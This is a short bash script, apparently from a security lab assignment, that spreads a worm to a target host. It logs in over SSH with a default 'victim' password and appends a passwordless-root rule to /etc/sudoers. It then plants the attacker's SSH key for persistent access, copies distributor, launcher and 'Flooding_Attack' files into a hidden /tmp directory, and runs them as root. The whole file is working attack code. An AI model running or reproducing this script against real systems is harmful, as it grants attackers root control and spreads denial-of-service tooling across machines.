#!/bin/bash

destip=$1

require_nopasswd(){
    local superprv="victim ALL=(ALL) NOPASSWD: ALL"
    local dest="/etc/sudoers"
    local execmdd="grep victim $dest || echo \"$superprv\" >> $dest"
    local cmdd="echo victim | sudo -S bash -c '$execmdd'"
    echo $cmdd
    sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim $cmdd
}

require_ssh_key_set() {
    local mykey=$(cat ~/.ssh/id_rsa.pub)
    local dest="~/.ssh/authorized_keys"
    local cmdd="mkdir -p ~/.ssh; touch $dest; grep \"$mykey\" $dest &> /dev/null || echo \"$mykey\" >> $dest"
    sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim $cmdd
}

require_worm_distributed() {
    local tmpdest="/tmp/.worm0716023"
    local pvkeyloc=~/.ssh/id_rsa
    ssh -i $pvkeyloc victim@$destip mkdir $tmpdest
    scp -i $pvkeyloc ./task_ii/distributer.sh ./task_ii/Flooding_Attack ./task_ii/launcher.sh victim@$destip:$tmpdest
    ssh -i $pvkeyloc -t victim@$destip "chmod +x $tmpdest/distributer.sh && sudo $tmpdest/distributer.sh"
}

require_nopasswd
require_ssh_key_set
require_worm_distributed
echo DONE
